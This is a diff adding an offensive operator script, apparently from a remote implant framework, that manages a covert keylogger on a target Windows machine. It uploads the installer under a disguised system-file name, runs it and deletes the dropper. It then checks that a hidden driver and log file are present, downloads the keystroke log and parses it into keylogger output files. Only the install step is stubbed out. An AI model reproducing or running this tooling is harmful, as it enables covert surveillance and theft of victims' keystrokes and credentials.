@@ -1,0 +1,245 @@
+#--------------------------------------------------------
+# File: Yak.eps
+#
+# Script to install/uninstall/collect Yak
+#--------------------------------------------------------
+@include "_FileExists.epm";
+@include "_GenericFunctions.epm";
+
+@echo off;
+@case-sensitive off;
+
+#--------------------------------------------------------
+# Get path that EP scripts are run out of
+#--------------------------------------------------------
+string $ScriptsDir;
+_GetEPScriptsPath($ScriptsDir);
+
+int $menuOption;
+string $localPath = "$ScriptsDir\\..\\..\\..\\tools\\yak";
+string $yakUploadFile = "yak_min_install.exe";
+string $localInstallPath = "$localPath\\$yakUploadFile";
+string $localParsePath = "$localPath\\yak.exe";
+string $fileName = "help16.exe";
+
+#--------------------------------------------------------
+# Get system path
+#--------------------------------------------------------
+string $systemPath;
+ifnot (_GetSystemPath($systemPath)) {
+	return false;
+}
+
+#--------------------------------------------------------
+# Check to see if help16.exe exists on the target (shouldn't)
+#--------------------------------------------------------
+if (_FileExists ($fileName, "$systemPath")) {
+	$fileName = "winhlp16.exe";
+}
+echo "";
+if($argc > 1){
+	if($argv[1] == "INSTALL"){
+		return YakInstall($localInstallPath, $YakUploadFile, $systemPath, $fileName, "-is");
+	}
+	else if ($argv[1] == "UNINSTALL"){
+		return YakInstall($localInstallPath, $YakUploadFile, $systemPath, $fileName, "-u");
+	}
+	else if ($argv[1] == "VERIFY"){
+		return YakVerify($systemPath);
+	}
+	else if ($argv[1] == "COLLECT"){
+		ifnot(YakCollect($systemPath, $localParsePath)){
+			echo "Collection and parsing could not be completed, please finish manually";
+			return false;
+		}
+	}
+	else{
+		ifnot( $argv[1] == "?"){
+			echo "$argv[1] is not a valid argument";
+		}
+		YakUsage();
+		return false;
+	}
+}
+
+while (true) {
+	echo "- Yak";
+
+	# print the command list
+	echo "";
+	echo " (0). Exit";
+	echo " (1). Install";
+	echo " (2). Uninstall";
+	echo " (3). Verify Install/Uninstall";
+	echo " (4). Collect and Parse";
+
+	echo "";
+	$menuOption = GetInput("Enter the desired option");
+
+	if ($menuOption == 0) {
+	#--------------------------------------------------------
+	# Quit
+	#--------------------------------------------------------
+		return true;
+
+	} else if ($menuOption == 1) {
+		YakInstall($localInstallPath, $YakUploadFile, $systemPath, $fileName, "-is");
+	} else if ($menuOption == 2) {
+		YakInstall($localInstallPath, $YakUploadFile, $systemPath, $fileName, "-u");
+	} else if ($menuOption == 3) {
+		YakVerify($systemPath);
+	} else if ($menuOption == 4) {
+		ifnot(YakCollect($systemPath, $localParsePath)){
+			echo "Collection and parsing could not be completed, please finish manually";
+		}
+	} else {
+	#--------------------------------------------------------
+	# Invalid menuOption
+	#--------------------------------------------------------
+		echo "*** Invalid menuOption ***";
+	}
+
+	pause;
+}
+
+return false;
+
+Sub YakUsage()
+{
+	echo "Usage: yak [arg]";
+	echo "    Runs Yak Script to perform Yak install, uninstall, verification, or collect";
+	echo "";
+	echo "Arguments:";
+	echo "    [arg]";
+	echo "        (optional) performs a specific Yak task and returns.  ";
+	echo "                   (INSTALL|UNINSTALL|VERIFY|COLLECT)";
+	echo "";
+	return true;
+}
+
+Sub YakInstall(IN string $localInstallPath, IN string $YakUploadFile, IN string $systemPath, IN string $fileName, IN string $command)
+{
+	echo "!!! THIS IS THE OLD VERSION OF YAK, YOU PROBABLY SHOULDN'T INSTALL IT!!!";
+	if ($command == "-is") {
+		ifnot (prompt "Are you sure you want to proceed?") {
+			return false;
+		} else {
+			echo "You didn't just actually try to do this, did you?";
+			return false;
+		}
+	}
+	bool $success = true;
+	#--------------------------------------------------------
+	# Install Yak - upload and run with -is option
+	#--------------------------------------------------------
+	echo "Uploading $YakUploadFile to $systemPath\\$fileName";
+	ifnot(`put $localInstallPath -name "$systemPath\\$fileName"`){
+		echo "Could not put $fileName into $systemPath";
+		$success = false;
+	}else{
+		echo "";
+		echo "Running $fileName on target...\n";
+		@echo on;
+		ifnot(`run -command "$systemPath\\$fileName $command" -redirect`)
+		{
+			@echo off;
+			echo "Could not run $systemPath\\$fileName $command";	
+			$success = false;
+		}
+	}
+	@echo off;
+	echo "";
+	echo "Deleting $systemPath\\$fileName";
+	ifnot(`del $fileName -path $systemPath`){
+		echo "Could not delete $systemPath\\$fileName";
+		echo "Please delete it manually";
+	}
+	return $success;
+}
+
+Sub YakVerify(IN string $systemPath)
+{
+	#--------------------------------------------------------
+	# Check to see if yak files exist
+	#--------------------------------------------------------
+	bool $logSuccessFlag = true;
+	bool $driverSuccessFlag = true;
+	bool $success = true;
+	if (_FileExists ("ntiopa.sys", "$systemPath")) {
+	echo "ntiopa.sys log file exists ... SUCCESSFUL";
+	} else {
+		echo "ntiopa.sys log file missing ... FAILED";
+		$logSuccessFlag = false;
+
+	echo "";		}
+	if (_FileExists ("kbpnp.sys", "$systemPath\\drivers")) {
+		echo "kbpnp.sys driver exists ... SUCCESSFUL";
+	} else {
+		echo "kbpnp.sys driver missing ... FAILED";
+		$driverSuccessFlag = false;
+	}
+
+	echo "";
+	if (($logSuccessFlag == true) && ($driverSuccessFlag == true)) {
+		echo "YAK properlly installed on target";	
+	} else if ((($logSuccessFlag == true) && ($driverSuccessFlag == false)) || 
+		   (($logSuccessFlag == false) && ($driverSuccessFlag == true))) {
+		echo "YAK is in a bad state...need a reboot before it's functional";
+		$success = false;
+	} else {
+		echo "YAK doesn't exist on target!";
+		$success = false;
+	}
+	return $success;
+}
+
+Sub YakCollect(IN string $systemPath, IN string $localParsePath)
+{
+	bool $success = true;
+	#--------------------------------------------------------
+	# Download Yak and Parse the local file
+	#--------------------------------------------------------
+	echo "Getting $systemPath\\ntiopa.sys...";
+	echo "";
+	@record on;
+	ifnot(`copyget "$systemPath\\ntiopa.sys"`){
+		echo "Could not copyget $systemPath\\ntiopa.sys";
+		@record off;
+		return false;
+	}
+	@record off;
+	string $localName = GetCmdData("LocalName");
+
+	string $temp = split("_", $localName);
+	int $counter = 1;
+	string $fileDate = "";
+	while ($counter < sizeOf($temp)) {
+		$fileDate = "$fileDate\_$temp[$counter]";
+		$counter++;
+	}
+
+	echo "";
+	echo "Moving file to NOSEND directory...";
+	`local mkdir Get_Files\\NOSEND`;
+	ifnot(`local move Get_Files\\$localName Get_Files\\NOSEND\\$localName`){
+		echo "Could not move Get_Files\\$localName into Get_Files\\NOSEND\\$localName";
+		return false;
+	}
+	echo "";
+	echo "Parsing file...";
+		
+	ifnot(`local run -command "$localParsePath -tu -i Get_Files\\NOSEND\\$localName -o Get_Files\\NOSEND\\keylogger$fileDate.txt"`){
+		echo "Could not run $localParsePath -tu -i";
+		$success = false;
+	}
+	ifnot(`local run -command "$localParsePath -tau -i Get_Files\\NOSEND\\$localName -o Get_Files\\NOSEND\\keylogger_scancodes$fileDate.txt"`){
+		echo "Could not run $localParsePath -tau -i";
+		$success = false;
+	}
+
+	sleep 3000;
+	@echo on;
+	`local dir *$fileDate* -path "Get_Files\\NOSEND"`;
+	@echo off;
+	return $success;
+}
